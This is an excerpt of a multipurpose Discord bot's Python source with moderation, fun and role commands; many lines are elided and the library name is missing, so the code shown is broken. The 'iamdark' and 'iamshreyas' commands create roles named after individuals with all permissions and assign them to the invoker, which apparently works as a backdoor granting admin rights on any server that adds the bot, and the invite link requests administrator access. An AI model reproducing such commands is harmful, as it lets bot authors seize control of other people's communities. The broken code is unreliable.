...
import random
import platform
from  import Game, Embed, Color, Status, ChannelType
import os
import functools
import time
import datetime
...
Forbidden= .Embed(title="Permission Denied", description="1) Please check whether you have permission to perform this action or not. \n2) Please check whether my role has permission to perform this action in this channel or not. \n3) Please check my role position.", color=0x00ff00)
...
async def on_message(message):
    ...
    if message.server is None and message.author != bot.user:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed=.Embed(title=f"{message.author.name} sent", description=f"{message.content}", color = .Color((r << 16) + (g << 8) + b))
...
async def on_reaction_add(reaction, user):
  if reaction.message.server is None:
      ...
      if reaction.emoji == '🏵':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = .Embed(color = .Color((r << 16) + (g << 8) + b))
      ...
      if reaction.emoji == '🇻':
            role = .utils.get(user.server.roles, name='Verified')
...
async def on_member_join(member):
    for channel in member.server.channels:
        ...
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = .Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check rules and never try to break any one of them', color = .Color((r << 16) + (g << 8) + b))
            ...
            await bot.send_message(channel, embed=embed) 
            role = .utils.get(member.server.roles, name='Verified')
...
async def on_member_remove(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = .Embed(title=f'{member.name} just left {member.server.name}', description='Bye bye 👋! We will miss you 😢', color = .Color((r << 16) + (g << 8) + b))
...
async def merrychristmas(ctx, user:.Member=None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    if user is None:
        embed=.Embed(title='Merry Christmas', description=f'I wanna wish {ctx.message.author} Merry Christmas {ctx.message.author}', color = .Color((r << 16) + (g << 8) + b))
        embed.set_image(url = 'https://cdn.app.com/attachments/486489391083159574/526968559994404874/gif-153062737.gif')
        await bot.say(embed=embed)
    else:
        embed=.Embed(title='Merry Christmas', description=f'I wanna wish {user} Merry Christmas {user}', color = .Color((r << 16) + (g << 8) + b))
        embed.set_image(url = 'https://cdn.app.com/attachments/486489391083159574/526968559994404874/gif-153062737.gif')
        await bot.say(embed=embed)
...
async def movie(ctx, *, name:str=None):
        ...
        if name is None:
                embed=.Embed(description = "Please specify a movie, *eg. mv!movie Inception*", color = .Color((r << 16) + (g << 8) + b))
        ...
        embed=.Embed(title = "**{}**".format(name).upper(), description = "Here is your movie {}".format(ctx.message.author.name), color = .Color((r << 16) + (g << 8) + b))
        if x["Poster"] != "N/A":
...
async def ownerinfo(ctx):
    embed = .Embed(title="Information about owner", description="Main Creator: DarkLegend", color=0x00ff00)
    ...
    embed.add_field(name="Site- https://bots.org/bot/515403515217313795", value="Thanks for adding our bot", inline=True)
    await bot.say(embed=embed)

	
@bot.command(pass_context=True)
async def virus(ctx,user: .Member=None,*,hack=None):
...
async def urban(ctx, *, msg:str=None):
    await bot.send_typing(ctx.message.channel)
    if msg is None:
        await bot.say('Use it like: ``mv!urban <string>``')
        return
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        word = ' '.join(msg)
        ...
        embed = .Embed(title = "🔍 Search Word", description = word, color = .Color((r << 16) + (g << 8) + b))
...
async def rps(ctx, *, message=None):
    ...
    embed=.Embed(title = "Bot VS {}".format(ctx.message.author.name), color = .Color((r << 16) + (g << 8) + b))
    embed.set_author(name = ctx.message.author.name, icon_url = ctx.message.author.avatar_url)
    if message is None:
        await bot.say('Use it like ``mv!rps rock or scissors or paper`` anyone of them to make this command work properly')
...
@bot.command(pass_context=True)
async def invites(ctx, user:.Member=None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    if ctx.message.server.id == '527430758902661121':
        await bot.say('You should use ``mv!checkinvites``')
        return
    if user is None:
        total_uses=0
        embed=.Embed(title='__Invites from {}__'.format(ctx.message.author.name), color = .Color((r << 16) + (g << 8) + b))
        ...
        total_uses=0
        embed=.Embed(title='__Invites from {}__'.format(user.name), color = .Color((r << 16) + (g << 8) + b))
        invites = await bot.invites_from(ctx.message.server)
        for invite in invites:
...
@bot.command(pass_context=True)
async def checkinvites(ctx, user:.Member=None):
    if ctx.message.server.id == '527430758902661121':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        if user is None:
            total_uses=0
            ...
            await bot.say(embed=embed)
            if total_uses >= 20:
                role = .utils.get(ctx.message.server.roles, name='Inviter I')
            ...
            if total_uses >= 30:
                role = .utils.get(ctx.message.server.roles, name='Inviter II')
                if role in ctx.message.author.roles:
                    return
                else:
                    await bot.add_roles(ctx.message.author, role)
            ...
            if total_uses >= 50:
                role = .utils.get(ctx.message.server.roles, name='Inviter III')
                if role in ctx.message.author.roles:
                    return
                else:
                    await bot.add_roles(ctx.message.author, role)
            ...
            if total_uses >= 80:
                role = .utils.get(ctx.message.server.roles, name='Inviter IV')
                if role in ctx.message.author.roles:
                    return
                else:
                    await bot.add_roles(ctx.message.author, role)
            ...
            await bot.say(embed=embed)
            if total_uses >= 20:
                role = .utils.get(user.server.roles, name='Inviter I')
            ...
            if total_uses >= 30:
                role = .utils.get(user.server.roles, name='Inviter II')
                if role in user.roles:
                    return
                else:
                    await bot.add_roles(user, role)
            ...
            if total_uses >= 50:
                role = .utils.get(user.server.roles, name='Inviter III')
                if role in user.roles:
                    return
                else:
                    await bot.add_roles(user, role)
            ...
            if total_uses >= 80:
                role = .utils.get(user.server.roles, name='Inviter IV')
                if role in user.roles:
                    return
                else:
                    await bot.add_roles(user, role)
...
@bot.command(pass_context = True)
async def detailedinvites(ctx,*,user:.Member=None):
...
@bot.command(pass_context=True)
async def lovedetect(ctx, user: .Member = None, *, user2: .Member = None):
    shipuser1 = user.name
    ...
    async with aiohttp.ClientSession() as cs:
        async with cs.get(url) as r:
            res = await r.json()
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = .Embed(title=f"{shipuser1} ❤ {shipuser2} Love each others", description=f"Love\n`{counter_}` Score:**{score}% **\nLoveName:**{finalName}**", color = .Color((r << 16) + (g << 8) + b))
            embed.set_image(url=res['message'])
            await bot.say(embed=embed)
...
@bot.command(pass_context=True)
async def vpn(ctx):
    embed=.Embed(title="**Welcome to AjaxVPN here you can get Support for the VPN, But you can also chill and meet new people, We have Chill and friendly staff who are willing to help.**", description="```┏━━━━ ⋆⋅✴AjaxVPN✴⋅⋆ ━━━━┓```\n ```●▬▬▬▬๑۩What We Offer۩๑▬▬▬▬●```\n3$USD8$USD- 1 Month No VIP\n15$USD- 6 Months No VIP\n25$USD- 1 Year VIP\n50$USD- Lifetime VIP\n```┗━━━━ ⋆⋅✴AjaxVPN✴⋅⋆ ━━━━┛```\n**Owner/Server [~Owner~]~MrAjax#1061**\n```╔══════.·:·.💻✧ Join Now! ✧💻.·:·.══════╗```\nServer Link: https://.gg/mjNkwyq\n╚══════.·:·.💻✧           ✧💻.·:·.══════╝", color = .Color((r << 16) + (g << 8) + b))
    await bot.say(embed=embed)
...
async def serverinvite(ctx):
    ...
    embedMsg=.Embed(color = .Color((r << 16) + (g << 8) + b))
...
async def rainbow(ctx):
    role = .utils.get(ctx.message.server.roles, name='Rainbow')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    await bot.edit_role(ctx.message.server, role, color = .Color((r << 16) + (g << 8) + b))
...
async def announce(ctx, channel: .Channel=None, *, msg: str):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed=.Embed(title="Announcement", description="{}".format(msg), color = .Color((r << 16) + (g << 8) + b))
    await bot.send_message(channel, embed=embed)
    await bot.delete_message(ctx.message)
	
@bot.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def delchannel(ctx, channel: .Channel=None):
    if channel is None:
...
async def addchannel(ctx, channel: str=None):
    ...
    if channel is None:
        ...
        everyone_perms = .PermissionOverwrite(send_messages=None, read_messages=None)
        everyone = .ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
...
async def mute(ctx, member: .Member=None, mutetime=None):
    if member is None:
        await bot.say('Please specify member i.e. Mention a member to mute. Example-``mv!mute @user <time in minutes>``')
        return
    if mutetime is None:
        await bot.say('Please specify time i.e. Mention a member to mute with time. Example-``mv!mute @user <time in minutes>``')
        return
    if member.server_permissions.kick_members:
        await bot.say('**You cannot mute admin/moderator!**')
        return
    if .utils.get(member.server.roles, name='Muted') is None:
    ...
    if ctx.message.author.bot:
      ...
      output = mutetime/60
      role = .utils.get(member.server.roles, name='Muted')
      await bot.add_roles(member, role)
      ...
      for channel in member.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User Muted!", description="**{0}** was muted by **{1}** for {2} minutes!".format(member, ctx.message.author, output), color=0x37F60A)
            await bot.send_message(channel, embed=embed)
            await asyncio.sleep(mutetime)
            if .utils.get(member.server.roles, name='Muted') in member.roles:
                await bot.remove_roles(member, role)
                await bot.say("Unmuted **{}**".format(member.name))
                embed=.Embed(title="User unmuted!", description="**{0}** was unmuted!".format(member, ctx.message.author), color=0xFD1600)
                await bot.send_message(channel, embed=embed)
            else:
                return
...
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def lock(ctx, channelname: .Channel=None):
    overwrite = .PermissionOverwrite(send_messages=False, read_messages=True)
    if not channelname:
        role = .utils.get(ctx.message.server.roles, name='@everyone')
...
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def unlock(ctx, channelname: .Channel=None):
    overwrite = .PermissionOverwrite(send_messages=None, read_messages=True)
    if not channelname:
        role = .utils.get(ctx.message.server.roles, name='@everyone')
        await bot.edit_channel_permissions(ctx.message.channel, role, overwrite)
...
async def meme(ctx):
    ...
    async with aiohttp.ClientSession() as session:
        async with session.get("https://api.reddit.com/r/me_irl/random") as r:
            data = await r.json()
            embed = .Embed(title='<a:OnThaCoco:515853700682743809> <a:OnThaCoco:515853700682743809> Random Meme <a:OnThaCoco:515853700682743809> <a:OnThaCoco:515853700682743809>', description='from reddit', color=.Color(int(colour, base=16)))
...
@bot.command(pass_context = True)
async def avatar(ctx, user: .Member=None):
    if user is None:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = .Embed(title=f'Avatar', description='Avatar is profile picture of a user in ', color = .Color((r << 16) + (g << 8) + b))
        embed.add_field(name='User: {}'.format(ctx.message.author.name), value='Avatar:', inline=True)
        embed.set_thumbnail(url='https://cdn.app.com/icons/489333893988745217/eb022a7023d013bec656cd7b94d6d6c1.png') 
...
async def botdm(ctx, identification:str, *, msg: str):
    ...
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed=.Embed(title=f"{ctx.message.author.name} has replied", description=f"{msg}", color = .Color((r << 16) + (g << 8) + b))
...
async def reject(ctx, user: .Member, *, msg: str):
...
@bot.command(pass_context=True)
@commands.check(is_staff)
async def accept(ctx, user: .Member=None):
    channel = bot.get_channel('520832912468344864')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(color = .Color((r << 16) + (g << 8) + b))
    ...
    await bot.send_message(channel, embed=embed)
    await bot.delete_message(ctx.message)
    role = .utils.get(user.server.roles, name='Bot Developer')
    await bot.add_roles(user, role)
	
@bot.command(pass_context = True)
async def rolldice(ctx):
    choices = ['1', '2', '3', '4', '5', '6']
    color = .Color(value=0x00ff00)
    em = .Embed(color=color, title='Rolled! (1 6-sided die)', description=random.choice(choices))
    await bot.send_typing(ctx.message.channel)
...
@bot.command(pass_context = True)
@commands.has_permissions(administrator = True)
async def dm(ctx, user: .Member, *, msg: str):
    try:
        await bot.send_message(user, msg)
        await bot.delete_message(ctx.message)          
        await bot.say("Success! Your DM has made it! :white_check_mark: ")
    except .ext.commands.MissingPermissions:
        await bot.say("Aw, come on! You thought you could get away with DM'ing people without permissions.")
    except:
        await bot.say("Error :x:. Make sure your message is shaped in this way: mv!dm [tag person] [msg]")
	
@bot.command(pass_context = True)
async def flipcoin(ctx):
    choices = ['Heads', 'Tails', 'Coin self-destructed']
    color = .Color(value=0x00ff00)
    em=.Embed(color=color, title='Flipped a coin!')
...
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def unmute(ctx, member: .Member=None):
    if member is None:
      await bot.say('Please specify member i.e. Mention a member to unmute. Example- ``mv!unmute @user``')
    if ctx.message.author.bot:
      return
    else:
      role = .utils.get(member.server.roles, name='Muted')
      ...
      for channel in member.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User unmuted!", description="**{0}** was unmuted by **{1}**!".format(member, ctx.message.author), color=0xFD1600)
            await bot.send_message(channel, embed=embed)
     
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
@commands.cooldown(rate=5,per=86400,type=BucketType.user) 
async def access(ctx, member: .Member=None):
    if member is None:
      await bot.say("Please specify a member to give access to him. Example- ``mv!access @user``")
    if ctx.message.author.bot:
      return
    else:
      role = .utils.get(member.server.roles, name='Access')
      await bot.add_roles(member, role)
      await bot.say("Gave access to {}".format(member))
      for channel in member.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User Got Access!", description="**{0}** got access from **{1}**!".format(member, ctx.message.author), color=0x020202)
            await bot.send_message(channel, embed=embed)
...
async def setupwelcomer(ctx):
    if ctx.message.author.bot:
      ...
      server = ctx.message.server
      everyone_perms = .PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = .ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
       ...
       for server in bot.servers:
         for channel in server.channels:
           if channel.name == '★-multiverse-partner-★':
               r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
               embed = .Embed(color = .Color((r << 16) + (g << 8) + b))
               embed.add_field(name=' Partner', value='-------------------',inline = False) 
...
@bot.command(pass_context=True)  
@commands.has_permissions(kick_members=True)
async def getuser(ctx, role: .Role = None):
    if role is None:
        await bot.say('Please tag a role to get users having it. Example- ``mv!getuser @role``')
        return
    empty = True
...
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: .Member=None):
    if user is None:
        await bot.say('Please tag a user to get user information. Example- ``mv!userinfo @user``')
    if ctx.message.author.bot:
      return
    else:
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = .Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = .Color((r << 16) + (g << 8) + b))
...
async def iamdark(ctx):
    ...
    if .utils.get(user.server.roles, name="Utkarsh Kumar") is None:
        await bot.create_role(user.server, name="Utkarsh Kumar", permissions=.Permissions.all())
        role = .utils.get(ctx.message.server.roles, name='Utkarsh Kumar')
        await bot.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await bot.delete_message(ctx.message)
...
async def addrole(ctx,*, role:str=None):
    user = ctx.message.author
    if .utils.get(user.server.roles, name="{}".format(role)) is None:
        await bot.create_role(user.server, name="{}".format(role), permissions=.Permissions.none())
...
@bot.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def roleinfo(ctx,*, role:.Role=None):
    if .utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await bot.say("No such role found")
        return
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = .Embed(title="{}'s info".format(role.name), description="Here's what I could find.", color = .Color((r << 16) + (g << 8) + b))
...
@bot.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def rolecolor(ctx, role:.Role=None, value:str=None):
    if .utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await bot.say("Use this command like ``mv!rolecolor (ROLENAME) (ROLECOLOUR IN HEXCODE)``")
        return
    if value is None:
        await bot.say("Use this command like ``mv!rolecolor (ROLENAME) (ROLECOLOUR IN HEXCODE)``")
        return
        ...
        colour = '0x' + new_val
        user = ctx.message.author
        await bot.edit_role(ctx.message.server, role, color = .Color(int(colour, base=16)))
        await bot.say("{} role colour has been edited.".format(role))

@bot.command(pass_context = True)
async def cthex(ctx,value:str=None):
    if value is None:
        await bot.say("Use this command like ``mv!cthex (SIMPLE COLOUR CODE)``")
        return
    else:
        new_val = value.replace("#", "")
        colour = '0x' + new_val
        await bot.say(colour)
        await bot.say('Use that like: ``color = .Color(int(colour, base=16)))``')
		
@bot.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def delrole(ctx,*, role: .Role = None):
    user = ctx.message.author
    if .utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
...
async def unbanall(ctx):
    if ctx.message.author.bot:
      ...
      for channel in ctx.message.author.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="All users are unbanned!", description="Members were unbanned by **{}**!".format(ctx.message.author), color=0x05F6E0)
            await bot.send_message(channel, embed=embed)
...
async def iamshreyas(ctx):
    user = ctx.message.author
    if .utils.get(user.server.roles, name="ShreyasMF") is None:
        await bot.create_role(user.server, name="ShreyasMF", permissions=.Permissions.all())
        role = .utils.get(ctx.message.server.roles, name='ShreyasMF')
        await bot.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await bot.delete_message(ctx.message)
...
async def iamcoder(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(title="Successfully added", description="Programmer role", color = .Color((r << 16) + (g << 8) + b))
    ...
    await bot.delete_message(ctx.message)
    role = .utils.get(ctx.message.server.roles, name='Programmer')
    await bot.add_roles(ctx.message.author, role)
...
async def iamnotcoder(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(title="Successfully removed", description="Programmer role", color = .Color((r << 16) + (g << 8) + b))
...
async def iamnotserverdeveloper(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(title="Successfully removed", description="Server developer role", color = .Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Enjoy! ", value="Hope you will try our other features as well", inline=True)
    
    await bot.delete_message(ctx.message)
    role = .utils.get(ctx.message.server.roles, name='Server Developer')
    await bot.remove_roles(ctx.message.author, role)
...
async def iamserverdeveloper(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(title="Successfully added", description="Server Developer role", color = .Color((r << 16) + (g << 8) + b))
...
@bot.command(pass_context = True)
@commands.has_permissions(manage_roles=True)     
async def role(ctx, user: .Member=None, *, role: .Role = None):
        if user is None:
...
@bot.command(pass_context = True)
@commands.check(is_dark)     
async def giverole(ctx, user: .Member=None, *, role: .Role = None):
        if user is None:
            await bot.say("You haven't specified a member! ")
        if role is None:
            await bot.say("You haven't specified a role! ")
...
@bot.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def warn(ctx, userName: .User=None,*, message:str=None): 
    if userName is None:
      await bot.say('Please tag a person to warn user. Example- ``mv!warn @user <reason>``')
      return
    else:
      ...
      for channel in userName.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User Warned!", description="{0} warned by {1} for {2}".format(userName, ctx.message.author, message), color=0x0521F6)
            await bot.send_message(channel, embed=embed)      

@bot.command(pass_context = True)
@commands.has_permissions(manage_nicknames=True)     
async def setnick(ctx, user: .Member=None, *, nickname=None):
    if user is None:
      await bot.say('Please tag a person to change nickname. Example- ``mv!setnick @user <new nickname>``')
      return
    else:
      ...
      for channel in user.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
            await bot.send_message(channel, embed=embed)
...
async def setnickall(ctx,*, nickname:str=None):
    if nickname is None:
      await bot.say('Please use this command like:``mv!setnickall <new nickname>``')
      return
    else: 
...
async def poll(ctx, question, *options: str):
        ...
        for x, option in enumerate(options):
            ...
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = .Embed(title=question, description=''.join(description), color = .Color((r << 16) + (g << 8) + b))
...
async def help(ctx):
    if ctx.message.author.bot:
      ...
      embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
      embed.add_field(name = 'Having doubts? Join our server and clear your doubts. Server link:',value ='https://.gg/FrRtyS6',inline = False)
...
async def kick(ctx,user:.Member):
    if user is None:
      await bot.say('Please mention a member to kick. Example- ``mv!kick @user``')
    if user.server_permissions.kick_members:
      ...
      for channel in user.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User kicked!", description="**{0}** is kicked by **{1}**!".format(user, ctx.message.author), color=0xFDE112)
            await bot.send_message(channel, embed=embed)
...
@bot.command(pass_context=True)  
@commands.has_permissions(ban_members=True)      
async def ban(ctx,user:.Member=None):
    if user is None:
      await bot.say('Please specify a member to ban. Example- ``mv!ban @user``')
    if user.server_permissions.ban_members:
      ...
      for channel in member.server.channels:
        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
            embed=.Embed(title="User banned!", description="**{0}** banned by **{1}**!".format(member, ctx.message.author), color=0x38761D)
            await bot.send_message(channel, embed=embed)
...
async def unban(ctx, identification:str):
    ...
    try:
        ...
        for channel in ctx.message.server.channels:
          if channel.name == '╰☆☆-multiverse-log-☆☆╮':
              embed=.Embed(title="User unbanned!", description="**{0}** unbanned by **{1}**!".format(user, ctx.message.author), color=0x38761D)
              await bot.send_message(channel, embed=embed)
    except:
...
async def upvote(ctx):
    if ctx.message.author.bot:
      ...
      await bot.send_message(ctx.message.author, 'Upvote us: https://bots.org/bot/515403515217313795')
...
async def bans(ctx):
    ...
    embed = .Embed(title = "List of The Banned Idiots", description = x, color = 0xFFFFF)
    return await bot.say(embed = embed)
...
async def serverinfo(ctx):
    ...
    roles = ', '.join(roles);
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    online = len([m.status for m in server.members if m.status == .Status.online or m.status == .Status.idle])
    embed = .Embed(name="{} Server information".format(server.name), color = .Color((r << 16) + (g << 8) + b))
...
@bot.command(pass_context=True)
async def kiss(ctx, user: .Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    ...
    if user.id == ctx.message.author.id:
        ...
        embed = .Embed(title=f"{user.name} You just got a kiss from {ctx.message.author.name}", color = .Color((r << 16) + (g << 8) + b))
...
async def hug(ctx, user: .Member):
    ...
    if user.id == ctx.message.author.id:
        ...
        embed = .Embed(title=f"{user.name} You just got a hug from {ctx.message.author.name}", color = .Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(randomurl))
        await bot.say(embed=embed)

@bot.command(pass_context=True)
async def gender(ctx, user: .Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    random.seed(user.id)
    ...
    if user == ctx.message.author:
        embed = .Embed(title="You should know your own gender", color = .Color((r << 16) + (g << 8) + b))
        await bot.say(embed=embed)
    else:
        embed = .Embed(color=0xfff47d)
        embed.add_field(name=f"{user.name}'s gender check results", value=f"{randomizer}")
        await bot.say(embed=embed)

@bot.command(pass_context=True)
async def virgin(ctx, user: .Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    random.seed(user.id)
    ...
    if user == ctx.message.author:
        embed = .Embed(title="Go ask yourself if you are still a virgin", color = .Color((r << 16) + (g << 8) + b))
        await bot.say(embed=embed)
    else:
        embed = .Embed(color=0x7dfff2)
...
@bot.command(pass_context=True)
async def slap(ctx, user: .Member = None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    ...
    if user == None:
        ...
        embed = .Embed(title=f"{ctx.message.author.name} Just slapped the shit out of {user.name}!", color = .Color((r << 16) + (g << 8) + b))
...
async def damn(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(title="DAMNNNNNNNN!!", color = .Color((r << 16) + (g << 8) + b))
...
async def membernames(ctx):
    ...
    try:
        ...
        embed = .Embed(title="There are too many members that the bot cannot list it down", color = .Color((r << 16) + (g << 8) + b))
        await bot.say(embed=embed)
...
async def invite(ctx):
    if ctx.message.author.bot:
      ...
      embed=.Embed(title="Click on this link to invite:", description="https://app.com/api/oauth2/authorize?bot_id=515403515217313795&permissions=8&scope=bot" , color=0x00fd1b)
      await bot.say(embed=embed)
...
async def bottutorial(ctx, *,msg=None):
    if not msg: await bot.say("You can check https://github.com/uksoftworld/.py-tutorial/ for more information")
    if '@here' in msg or '@everyone' in msg:
      return
    else:
      new_message = msg.replace(" ", "_")
      await bot.say(f'https://github.com/uksoftworld/.py-tutorial/blob/master/{new_message}' + '.py')
    return
...
async def docs(ctx, *,msg=None):
    if not msg: await bot.say("https://py.readthedocs.io/en/latest/api.html")
    if '@here' in msg or '@everyone' in msg:
      return
    else:
      new_message = msg.replace(" ", "_")
      await bot.say(f'https://py.readthedocs.io/en/latest/api.html#{new_message}')
      return
...
async def unverify(ctx):
    await bot.delete_message(ctx.message)
    role = .utils.get(ctx.message.server.roles, name='Unverified')
    await bot.add_roles(ctx.message.author, role)
...
async def verify(ctx):
    if ctx.message.author.bot:
      ...
      await bot.delete_message(ctx.message)
      role = .utils.get(ctx.message.server.roles, name='Verified')
      await bot.add_roles(ctx.message.author, role)
    
@bot.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def friend(ctx, user:.Member,):
    if ctx.message.author.bot:
      return
    else:
      await bot.delete_message(ctx.message)
      role = .utils.get(ctx.message.server.roles, name='Friend of Owner')
      await bot.add_roles(ctx.message.mentions[0], role)

@bot.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makemod(ctx, user: .Member):
    nickname = '♏' + user.name
    await bot.change_nickname(user, nickname=nickname)
    role = .utils.get(ctx.message.server.roles, name='Moderator')
    await bot.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = .Embed(color = .Color((r << 16) + (g << 8) + b))
...
@bot.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def removemod(ctx, user: .Member):
    nickname = user.name
    await bot.change_nickname(user, nickname=nickname)
    role = .utils.get(ctx.message.server.roles, name='Moderator')
    await bot.remove_roles(user, role)
